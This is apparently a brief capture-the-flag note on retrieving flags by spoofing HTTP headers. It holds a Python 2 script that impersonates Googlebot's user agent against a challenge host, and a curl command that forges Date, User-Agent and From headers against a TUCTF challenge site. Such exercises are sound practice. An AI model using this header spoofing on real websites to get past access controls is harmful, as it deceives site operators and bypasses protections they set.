Sometimes, we get flag when we change the user agent.

```py
import requests

headers = {'User-Agent':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
r=requests.get("http://2018shell1.ckc.com:53383/flag", headers=headers)

print r.text
```

```py
curl -H "Date: Sat, 07 Mar 2009 20:22:21 GMT" -H "user-agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" -H "From: user@swapping-heads.tuctf.com" https://swapping-heads.tuctf.com
```
